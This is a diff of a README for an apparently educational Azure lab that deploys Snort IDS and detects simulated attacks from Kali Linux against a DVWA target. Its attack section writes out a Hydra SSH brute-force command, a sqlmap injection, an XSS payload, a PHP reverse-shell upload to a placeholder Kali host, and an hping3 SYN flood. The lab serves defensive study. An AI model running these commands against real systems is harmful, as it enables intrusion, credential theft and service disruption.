@@ -1,402 +1,356 @@
-## Cyber Security Project: Deploying and Monitoring Snort IDS on Ubuntu in Azure
+# Cybersecurity Project: Deploying and Monitoring Snort IDS on Ubuntu in Azure
 
 ### Table of Contents
 
-1. Introduction
-2. Project Overview
-3. Prerequisites
-4. Step-by-Step Instructions
-   1. Setting Up the Environment in Azure
-   2. Deploying Snort IDS
-   3. Configuring Snort Rules
-   4. Simulating Brute-Force SSH Attack
-   5. Monitoring and Logging Snort Alerts
-   6. Installing Additional Tools for Testing
-   7. Downloading and Configuring Snort Rules
-5. Troubleshooting and Fine-Tuning
-6. Conclusion
-7. Future Work
+1. [Introduction](#introduction)
+2. [Project Overview](#project-overview)
+3. [Environment Setup](#environment-setup)
+    1. [Azure Virtual Machines](#azure-virtual-machines)
+    2. [Network Configuration](#network-configuration)
+4. [Installing and Configuring Snort](#installing-and-configuring-snort)
+    1. [Installing Dependencies](#installing-dependencies)
+    2. [Installing and Configuring Snort](#installing-and-configuring-snort)
+    3. [Downloading Snort Rules](#downloading-snort-rules)
+5. [Writing Snort Rules](#writing-snort-rules)
+6. [Attacks and Simulations with Kali Linux](#attacks-and-simulations-with-kali-linux)
+    1. [Brute Force SSH Attack](#brute-force-ssh-attack)
+    2. [SQL Injection Attack on DVWA](#sql-injection-attack-on-dvwa)
+    3. [Cross-Site Scripting (XSS) Attack](#cross-site-scripting-xss-attack)
+    4. [File Upload Vulnerability Attack](#file-upload-vulnerability-attack)
+    5. [Denial of Service (DoS) Attack](#denial-of-service-dos-attack)
+7. [Monitoring Snort Alerts](#monitoring-snort-alerts)
+8. [Advanced Configurations](#advanced-configurations)
+    1. [Custom Snort Rules](#custom-snort-rules)
+    2. [Setting Up Snort in IPS Mode](#setting-up-snort-in-ips-mode)
+9. [Troubleshooting](#troubleshooting)
+10. [Conclusion](#conclusion)
+11. [Future Work](#future-work)
 
 ---
 
-### Introduction
+## Introduction
 
-As cyber threats grow in complexity and volume, organizations must employ sophisticated defenses to monitor and protect their networks. One such defense is an **Intrusion Detection System (IDS)**, which monitors network traffic for malicious activities and generates alerts when suspicious events are detected. This project focuses on deploying and configuring the popular open-source IDS, **Snort**, on an Ubuntu server within the Azure cloud infrastructure.
+This project is a hands-on exploration of network security through the deployment and configuration of **Snort**, a popular open-source **Intrusion Detection System (IDS)**, on an **Ubuntu** server hosted in **Azure**. The setup simulates real-world attacks from a **Kali Linux** attacker machine against an **Ubuntu target machine** running services like **DVWA** (Damn Vulnerable Web Application), SSH, and others.
 
-In this project, we will simulate a network environment with three machines: 
-- a **Snort IDS Server** on Ubuntu, 
-- a **Target Machine** running vulnerable services on Ubuntu, 
-- and an **Attacker Machine** (Kali Linux) designed to launch attacks on the target.
-
-We will configure Snort to detect common network attacks, particularly focusing on SSH brute-force attempts. By the end of this project, you will understand how to deploy and configure Snort, write custom rules, simulate attacks, and monitor alerts. This is a foundational setup that will prepare you for more advanced network security tasks.
+The primary focus of this project is on how Snort can be used to detect, log, and prevent various network attacks, such as brute-force SSH attacks, SQL injection, Denial of Service (DoS) attacks, and more.
 
 ---
 
-### Project Overview
+## Project Overview
 
-- **Snort IDS Server**: An Ubuntu Server running Snort IDS to monitor network traffic and detect malicious activities.
-- **Target Machine**: An Ubuntu Server running vulnerable services that will serve as the victim machine.
-- **Attacker Machine**: A Kali Linux VM used to simulate different types of attacks (such as brute-force attacks on SSH).
-- **Azure Environment**: All virtual machines are hosted in Microsoft Azure within the same virtual network for seamless communication between machines.
+- **Snort IDS Server**: Ubuntu Server running Snort IDS to monitor network traffic.
+- **Target Machine**: Ubuntu Server with services (e.g., DVWA, SSH) exposed for attack simulations.
+- **Attacker Machine**: Kali Linux used for simulating a variety of attacks.
+- **Azure Infrastructure**: All virtual machines are hosted on **Azure** and connected through the same virtual network (VNet).
 
-This setup allows for controlled testing of security tools and attack simulations, providing valuable insights into how Snort works in a real-world environment.
+### Key Objectives:
 
----
-
-### Prerequisites
-
-Before diving into the detailed steps, ensure you have the following:
-
-- **Azure Subscription**: An active Azure account with sufficient credits to deploy multiple VMs.
-- **Basic Networking Knowledge**: Understanding of IP addresses, subnets, and basic networking concepts.
-- **Familiarity with Linux**: You should know how to use basic Linux commands, navigate the terminal, and install software packages.
-- **Attack Simulation Tools**: We will be using tools like **Hydra** for brute-force attacks from the Kali Linux VM.
-- **Snort Account**: You will need to register an account on [Snort’s website](https://www.snort.org/) to download the latest rule sets.
+- **Intrusion Detection**: Detect and log malicious activities using Snort IDS.
+- **Attack Simulations**: Use **Kali Linux** to launch various attacks, including brute-force SSH, SQL injection, XSS, and DoS.
+- **Rule Writing**: Configure Snort rules to detect specific attack signatures.
+- **Alert Monitoring**: Analyze Snort alerts and logs to understand detection mechanisms.
 
 ---
 
-### Step-by-Step Instructions
+## Environment Setup
 
-#### Setting Up the Environment in Azure
+### Azure Virtual Machines
 
-##### 1. Create a Resource Group
+We set up three virtual machines in **Azure** for this project:
 
-To organize our resources in Azure, we first create a **Resource Group**. Resource groups allow you to manage related resources, like virtual machines and networks, under a single umbrella.
+1. **Snort IDS Server** (Ubuntu 20.04)
+   - This VM will host Snort IDS.
+   - SSH access is enabled for management purposes.
+   
+2. **Target Machine** (Ubuntu 20.04)
+   - This machine is configured with vulnerable services like SSH and DVWA for attack simulations.
+   
+3. **Kali Linux** (Kali Linux)
+   - This VM is used to perform the attacks (brute force, DoS, etc.) on the target machine.
 
-- **Step 1**: Log into your [Azure Portal](https://portal.azure.com).
-- **Step 2**: Navigate to **Resource Groups** from the left-hand menu.
-- **Step 3**: Click on **Add** and create a new resource group named `CyberSecProjectRG`.
-- **Step 4**: Choose a region closest to your location for optimal performance (e.g., East US, West Europe).
-- **Step 5**: Click **Review + Create** and then **Create**.
+### Network Configuration
 
-##### 2. Create a Virtual Network (VNet)
+All VMs are hosted in the same **Virtual Network (VNet)** for easy communication:
 
-Next, we need to set up a virtual network that will house our virtual machines. This network will allow our VMs to communicate with each other privately.
+- **Virtual Network**: `10.0.0.0/16`
+- **Subnet**: `10.0.0.0/24`
+- **Public IPs**: Assigned for remote access via SSH and RDP.
 
-- **Step 1**: Navigate to **Virtual Networks** and click **Add**.
-- **Step 2**: Name your VNet `CyberSecVNet`.
-- **Step 3**: Set the **Address Space** to `10.0.0.0/16` (this will give us enough IP addresses to work with).
-- **Step 4**: Under **Subnets**, add a subnet named `DefaultSubnet` with an address range of `10.0.0.0/24`.
-- **Step 5**: Assign the virtual network to the resource group you created earlier (`CyberSecProjectRG`).
-- **Step 6**: Click **Create** to finalize your VNet.
-
-##### 3. Deploy the Ubuntu Target Machine
-
-The **Target Machine** will be a vulnerable Ubuntu server that will serve as the victim in our attack simulations. 
-
-- **Step 1**: Go to **Virtual Machines** and click **Add**.
-- **Step 2**: Name your VM `TargetVM` and select **Ubuntu Server 20.04 LTS** as the image.
-- **Step 3**: Choose a VM size that suits your budget (e.g., Standard B1s).
-- **Step 4**: Configure the VM to be deployed in the **CyberSecVNet** you created earlier.
-- **Step 5**: Enable **SSH access** by configuring the Network Security Group (NSG) to allow SSH on port **22**.
-- **Step 6**: Complete the deployment by clicking **Create**.
-
-##### 4. Deploy the Snort IDS Server
-
-The **Snort IDS Server** will monitor network traffic to detect malicious activities. We will also use **Ubuntu Server 20.04 LTS** for the Snort IDS server.
-
-- **Step 1**: Repeat the process from step 3, but this time name the VM `SnortIDSVM`.
-- **Step 2**: Ensure the VM is in the same **CyberSecVNet** and subnet.
-- **Step 3**: Configure SSH access on port **22** and complete the deployment.
-
-##### 5. Deploy the Kali Linux Attacker Machine
-
-The **Attacker Machine** will be a **Kali Linux** VM used for launching brute-force attacks and other exploits against the **TargetVM**.
-
-- **Step 1**: Navigate to **Virtual Machines** > **Add**.
-- **Step 2**: Search for **Kali Linux** in the Azure Marketplace and select the official image.
-- **Step 3**: Name the VM `KaliAttackerVM` and ensure it is deployed in the same **CyberSecVNet**.
-- **Step 4**: Complete the deployment, ensuring SSH access is allowed for external connections.
+Each VM is placed within this virtual network to allow traffic flow and attack simulations between the attacker, target, and Snort IDS machines.
 
 ---
 
-#### Deploying Snort IDS
+## Installing and Configuring Snort
 
-Once the environment is set up, we can install and configure **Snort** on the `SnortIDSVM` to monitor network traffic. Snort will be set up in **IDS mode** (as opposed to **IPS mode**) to detect attacks without blocking them.
+Snort acts as the core of this project, analyzing traffic and detecting attacks based on rules.
 
-##### 1. Update the System
+### Installing Dependencies
 
-Start by updating the package repositories and upgrading any existing software to the latest versions:
+Before installing Snort, we installed all necessary dependencies on the **Snort IDS Server**:
 
 ```bash
 sudo apt update && sudo apt upgrade -y
-```
-
-This ensures that the system is secure and all packages are up-to-date.
-
-##### 2. Install Required Dependencies
-
-Snort requires several dependencies for compiling and running effectively. Install the necessary libraries and tools:
-
-```bash
 sudo apt install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev bison flex zlib1g-dev liblzma-dev openssl libssl-dev pkg-config
 ```
 
-These libraries include development tools (like `build-essential`) and libraries for network packet capture (`libpcap`), pattern matching (`libpcre3`), and cryptography (`openssl`).
+These dependencies are required for building and running Snort.
 
-##### 3. Install DAQ (Data Acquisition Library)
+### Installing and Configuring Snort
 
-The **Data Acquisition Library (DAQ)** is required by Snort to process packet data. Install DAQ using the following steps:
+Next, we installed **DAQ** (Data Acquisition Library) and **Snort** itself:
 
-```bash
-wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz
-tar -xzvf daq-2.0.7.tar.gz
-cd daq-2.0.7
-./configure && make && sudo make install
-```
+1. **Install DAQ**:
 
-This will download, extract, and install DAQ.
+   ```bash
+   wget https://www.snort.org/downloads/snort/daq-2.0.7.tar.gz
+   tar -xzvf daq-2.0.7.tar.gz
+   cd daq-2.0.7
+   ./configure && make && sudo make install
+   ```
 
-##### 4. Install Snort
+2. **Install Snort**:
 
-Now it’s time to download and install **Snort** itself. We will use Snort version 2.9.20 in this setup:
+   ```bash
+   wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
+   tar -xzvf snort-2.9.20.tar.gz
+   cd snort-2.9.20
+   ./configure --enable-sourcefire && make && sudo make install
+   ```
 
-```bash
-wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
-tar -xzvf snort-2.9.20.tar.gz
-cd snort-2.9.20
-./configure --enable-sourcefire && make && sudo make install
-```
+3. **Create Snort Directories**:
 
-##### 5. Create Directories for Snort
+   ```bash
+   sudo mkdir -p /etc/snort/rules /var/log/snort /usr/local/lib/snort_dynamicrules
+   sudo touch /etc/snort/rules/white_list.rules /etc/snort/rules/black_list.rules
+   sudo chown -R snort:snort /etc/snort /var/log/snort
+   ```
 
-Snort requires specific directories for rules and log files. Let’s create those directories and set appropriate permissions:
+4. **Configure `snort.conf`**:
+   - We configured the Snort configuration file to define paths to the rules and other settings:
+     ```bash
+     sudo nano /etc/snort/snort.conf
+     ```
+   - Set up network variables:
+     ```bash
+     var HOME_NET 10.0.0.0/24
+     var RULE_PATH /etc/snort/rules
+     ```
 
-```bash
-sudo mkdir -p /etc/snort/rules /var/log/snort /usr/local/lib/snort_dynamicrules
-sudo touch /etc/snort/rules/white_list.rules /etc/snort/rules/black_list.rules
-sudo chown -R snort:snort /etc/snort /var/log/snort
-```
+### Downloading Snort Rules
 
-These commands set up the necessary directories for Snort to store its configuration, rule files, and logs.
+To enable Snort to detect a wide variety of attacks, we downloaded community and registered Snort rule sets:
 
-##### 6. Download Snort Rules
+1. **Community Rules**:
+   ```bash
+   wget https://www.snort.org/downloads/community/community-rules.tar.gz
+   sudo tar -xzvf community-rules.tar.gz -C /etc/snort/rules
+   ```
 
-Snort uses **rules** to identify different types of network traffic and classify them as malicious or benign. You can download the community rule set to get started:
+2. **Paid Rules**:
+   For registered users, download the latest Snort rules from [Snort’s official website](https://www.snort.org).
 
-```bash
-wget https://www.snort.org/downloads/community/community-rules.tar.gz
-sudo tar -xzvf community-rules.tar.gz -C /etc/snort/rules
-```
-
-You can also register for an account on the [Snort website](https://www.snort.org/) to download the latest paid rules.
-
-##### 7. Configure snort.conf
-
-The Snort configuration file (`snort.conf`) is where we define paths to the rule files and specify network variables. Open the configuration file for editing:
-
-```bash
-sudo nano /etc/snort/snort.conf
-```
-
-Set the path for the rule files:
-
-```bash
-var RULE_PATH /etc/snort/rules
-```
-
-Include the necessary rules:
-
-```bash
-include $RULE_PATH/local.rules
-include $RULE_PATH/community.rules
-```
-
-Save the changes and exit the editor.
-
-##### 8. Test Snort Configuration
-
-Before running Snort, it’s a good idea to test the configuration to ensure there are no errors:
-
-```bash
-sudo snort -T -c /etc/snort/snort.conf
-```
-
-If everything is set up correctly, you should see the message **"Snort successfully validated the configuration!"**.
+3. **Configure Rule Paths**:
+   Ensure that Snort knows where to find the rules:
+   ```bash
+   include $RULE_PATH/local.rules
+   include $RULE_PATH/community.rules
+   ```
 
 ---
 
-#### Configuring Snort Rules
+## Writing Snort Rules
 
-To detect malicious traffic, we need to create and configure rules. Snort comes with pre-configured rules for various types of attacks, but we can also create custom rules based on our specific use case.
+Writing custom Snort rules allows us to tailor Snort's detection capabilities to specific threats.
 
-##### 1. Create or Modify Local Rules
+### Example Custom Rule for SSH Brute Force Detection
 
-The **`local.rules`** file is where we can define custom rules. For example, let’s create a rule to detect SSH brute-force attempts:
+To detect brute force attempts on SSH (port 22), we wrote the following custom rule in `local.rules`:
 
 ```bash
 sudo nano /etc/snort/rules/local.rules
 ```
 
-Add the following rule to detect multiple failed login attempts on SSH (port 22):
-
 ```bash
-alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt Detected"; flags:S; threshold:type threshold, track by_src, count 3, seconds 60; sid:1000001; rev:1;)
+alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Detected"; flags:S; threshold:type threshold, track by_src, count 3, seconds 60; sid:1000001; rev:1;)
 ```
 
-This rule tracks incoming connection attempts to port 22 and generates an alert if there are three or more attempts within 60 seconds.
+- **Explanation**:
+  - `msg`: Custom message for the alert.
+  - `flags:S`: Detect SYN packets.
+  - `threshold`: Triggers an alert after 3 connection attempts within 60 seconds.
 
-##### 2. Include local.rules in snort.conf
+### Testing Snort Configuration
 
-Ensure that `local.rules` is included in the **`snort.conf`** file:
-
-```bash
-include $RULE_PATH/local.rules
-```
-
-##### 3. Verify and Reload Snort
-
-After adding the rule, test the configuration again to make sure there are no errors:
+Before running Snort, it’s important to test the configuration:
 
 ```bash
 sudo snort -T -c /etc/snort/snort.conf
 ```
 
-If there are no errors, restart Snort in IDS mode.
+This will check if there are any syntax or configuration errors in the Snort setup.
 
 ---
 
-#### Simulating Brute-Force SSH Attack
+## Attacks and Simulations with Kali Linux
 
-Now that Snort is configured and running, we can simulate a brute-force attack from the **Kali Linux** attacker machine.
+The **Kali Linux** machine is used to simulate various types of attacks against the **Target Ubuntu Machine**. These attacks are monitored by Snort for detection and logging.
 
-##### 1. Run Snort in IDS Mode
+### 1. Brute Force SSH Attack
 
-To monitor network traffic and generate alerts, start Snort in **IDS mode**:
+One of the first attacks we performed was an **SSH brute force** attack using **Hydra** from Kali Linux.
 
-```bash
-sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
-```
+#### Steps:
+1. **Launch Hydra to Brute Force SSH**:
+   ```bash
+   hydra -l saalim -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.0.0.4
+   ```
 
-This command will start Snort and display alerts directly in the console.
+   - `-l saalim`: Specifies the username to brute force.
+   - `-P /usr/share/wordlists/rockyou.txt`: Path to the password wordlist.
+   - `-t 4`: Specifies 4 concurrent threads.
+   - `ssh://10.0.0.4`: Target IP with SSH.
 
-##### 2. Simulate SSH Brute-Force Attack Using Hydra
+2. **Monitor Snort for Alerts**:
+   While the brute force attack is happening, we monitored Snort for alerts:
+   ```bash
+   sudo tail -f /var/log/snort/alert
+   ```
 
-From the **Kali Linux** VM, use the **Hydra** tool to simulate a brute-force attack on the SSH service running on the **TargetVM**. Replace `10.0.0.4` with the IP address of your **TargetVM**:
+   **Example Alert**:
+   ```
+   [**] [1:1000001:1] SSH Brute Force Detected [**]
+   {TCP} <source_ip>:<source_port> -> <target_ip>:22
+   ```
 
-```bash
-hydra -l saalim -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.0.0.4
-```
+### 2. SQL Injection Attack on DVWA
 
-This command will use a common password list (`rockyou.txt`) to attempt multiple SSH login attempts against the `saalim` user on the target machine.
+We used **SQLMap** to automate an SQL injection attack against the **DVWA** application running on the target machine.
+
+#### Steps:
+1. **Perform SQL Injection**:
+   ```bash
+   sqlmap -u "http://<target-ip>/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<session_id>" --dbs
+   ```
+
+   This attack enumerates the databases on the target system.
+
+2. **Monitor Snort for Alerts**:
+   Use `tail` to check for SQL injection-related alerts:
+   ```bash
+   sudo tail -f /var/log/snort/alert
+   ```
+
+### 3. Cross-Site Scripting (XSS) Attack
+
+Next, we performed a **Cross-Site Scripting (XSS)** attack on DVWA.
+
+#### Steps:
+1. **Inject Malicious Script**:
+   In the **XSS Reflected** section of DVWA, we injected the following script:
+   ```bash
+   <script>alert('XSS');</script>
+   ```
+
+2. **Monitor Snort**:
+   We monitored Snort for any custom XSS alerts, particularly by writing a custom rule to detect XSS.
+
+### 4. File Upload Vulnerability Attack
+
+We leveraged a **file upload vulnerability** in DVWA to gain a reverse shell.
+
+#### Steps:
+1. **Create a Malicious PHP Script**:
+   ```php
+   <?php
+   exec("/bin/bash -c 'bash -i >& /dev/tcp/<kali-ip>/4444 0>&1'");
+   ?>
+   ```
+
+2. **Upload the Script** via the DVWA file upload section.
+
+3. **Execute the Reverse Shell**:
+   After uploading, visit the uploaded PHP file URL to trigger the reverse shell:
+   ```bash
+   http://<target-ip>/DVWA/hackable/uploads/shell.php
+   ```
+
+4. **Monitor Snort**:
+   Custom Snort rules can be written to detect file uploads or the execution of PHP files in this case.
+
+### 5. Denial of Service (DoS) Attack
+
+We performed a **SYN Flood DoS Attack** using **hping3** from Kali Linux.
+
+#### Steps:
+1. **Launch DoS Attack**:
+   ```bash
+   sudo hping3 -S --flood -V -p 80 10.0.0.4
+   ```
+
+   This attack floods the target’s port 80 with SYN packets.
+
+2. **Monitor Snort for Alerts**:
+   Snort has built-in rules to detect SYN floods:
+   ```bash
+   sudo tail -f /var/log/snort/alert
+   ```
+
+   **Example Alert**:
+   ```
+   [**] [1:1000004:1] SYN Flood Detected [**]
+   {TCP} <source_ip>:<source_port> -> <target_ip>:80
+   ```
 
 ---
 
-#### Monitoring and Logging Snort Alerts
+## Monitoring Snort Alerts
 
-##### 1. Check for Alerts in the Console
-
-If Snort detects the brute-force attack, it will output alerts in real-time in the console where Snort is running.
-
-##### 2. Check Snort Log Files
-
-If Snort is logging to files, you can check the **alert log** for a record of all detected incidents:
+Snort alerts can be viewed in real-time using the following command:
 
 ```bash
 sudo tail -f /var/log/snort/alert
 ```
 
-##### 3. Example Alert
-
-For the SSH brute-force attack, you should see an alert similar to the following:
-
-```
-[**] [1:1000001:1] SSH Brute Force Attempt Detected [**]
-{TCP} <source_ip>:<source_port> -> <target_ip>:22
-```
-
-This indicates that Snort successfully detected multiple login attempts to the SSH service.
+For large-scale alert analysis, you can also forward logs to a central SIEM system or visualize them using tools like **Kibana**.
 
 ---
 
-#### Installing Additional Tools for Testing
+## Advanced Configurations
 
-##### 1. Installing Wireshark
+### Custom Snort Rules
 
-Wireshark is a popular packet capture tool that can be used alongside Snort for deeper traffic analysis. Install Wireshark on the **SnortIDSVM**:
+Throughout the project, we created various **custom Snort rules** for detecting specific attack patterns (e.g., brute-force SSH, SQL injection). These rules were stored in the `local.rules` file.
 
-```bash
-sudo apt install wireshark
-```
+### Setting Up Snort in IPS Mode
 
-During installation, choose **"Yes"** when prompted to allow non-superusers to capture packets.
+If you want Snort to actively block malicious traffic, you can switch Snort from **IDS mode** (detection) to **IPS mode** (prevention). This involves setting up **inline** mode:
 
----
-
-#### Downloading and Configuring Snort Rules
-
-##### 1. Download Latest Snort Rules
-
-You can download the latest Snort rules from [Snort’s official website](https://www.snort.org). For registered users, Snort provides the most up-to-date rule sets. Here’s how to download and extract them:
-
-```bash
-wget https://www.snort.org/rules/snortrules-snapshot-29190.tar.gz
-sudo tar -xzvf snortrules-snapshot-29190.tar.gz -C /etc/snort/rules
-```
-
-##### 2. Modify the snort.conf File
-
-After downloading the rules, make sure they are included in the `snort.conf` file:
-
-```bash
-include $RULE_PATH/snort.rules
-```
+1. **Configure iptables** to redirect traffic to Snort.
+2. **Run Snort in Inline Mode**:
+   ```bash
+   sudo snort -Q -c /etc/snort/snort.conf -i eth0
+   ```
 
 ---
 
-### Troubleshooting and Fine-Tuning
+## Troubleshooting
 
-While working with Snort, you may encounter several issues, such as rules not triggering or Snort not seeing traffic. Here are some common troubleshooting steps:
-
-##### 1. Verifying Network Interface Monitoring
-
-Make sure Snort is listening on the correct network interface. You can verify the interface name using:
-
-```bash
-ip a
-```
-
-Ensure that you are using the correct interface in the Snort command:
-
-```bash
-sudo snort -A console -q -c /etc/snort/snort.conf -i eth0
-```
-
-##### 2. Checking Rule Files
-
-If Snort isn’t detecting attacks, ensure the rule files are correctly loaded. Run Snort in test mode to validate the rules:
-
-```bash
-sudo snort -T -c /etc/snort/snort.conf
-```
-
-Check for any missing or misconfigured rule files.
-
-##### 3. Analyzing Traffic with tcpdump
-
-Use **tcpdump** to check if the traffic is reaching the Snort IDS:
-
-```bash
-sudo tcpdump -i eth0 port 22
-```
-
-This will display SSH traffic and help verify that the network is working as expected.
+### Common Issues:
+- **Snort Not Starting**: Check for syntax errors in the configuration file using `snort -T`.
+- **No Alerts**: Ensure Snort is running on the correct network interface (e.g., `eth0`) and that traffic is flowing through it.
+- **Rule Errors**: Make sure custom rules are properly formatted and included in the `snort.conf` file.
 
 ---
 
-### Conclusion
+## Conclusion
 
-In this project, we successfully deployed Snort IDS on an Ubuntu server in Azure, configured detection rules, and simulated a brute-force attack using Hydra from a Kali Linux VM. Snort successfully detected the attack and generated alerts based on the rules configured.
-
-The project demonstrates the power of Snort as an IDS for monitoring network traffic and detecting suspicious activities in real-time. This setup provides a foundation for further exploration into network security and IDS technologies.
+This project has demonstrated the deployment of **Snort IDS** on an **Ubuntu server** in **Azure**, the simulation of multiple network and web-based attacks, and the monitoring of those attacks using Snort. We gained experience in setting up vulnerable services (like DVWA), writing custom Snort rules, and analyzing security alerts.
 
 ---
 
-### Future Work
+## Future Work
 
-While this project focused on deploying and configuring Snort for basic attack detection, there is much more that can be explored:
-
-1. **Advanced Rule Writing**: Create more complex rules to detect a variety of attacks, such as SQL injection or malware propagation.
-2. **Intrusion Prevention Mode**: Explore using Snort in **IPS mode**, where it can actively block attacks rather than just logging them.
-3. **Integration with Other Tools**: Integrate Snort with SIEM tools like **Splunk** or **ELK Stack** for real-time log aggregation and analysis.
-4. **Automation**: Automate Snort rule updates and system monitoring with scripts or configuration management tools like **Ansible**.
+- **Deploying Snort in IPS Mode** to actively block threats.
+- **Automating Infrastructure Setup** using **Terraform** or **Ansible**.
+- **Integrating with a SIEM** like **Elasticsearch** or **Splunk** for advanced alert analysis.
+- **Exploring additional attacks** such as buffer overflows, malware propagation, or SSL/TLS vulnerabilities.
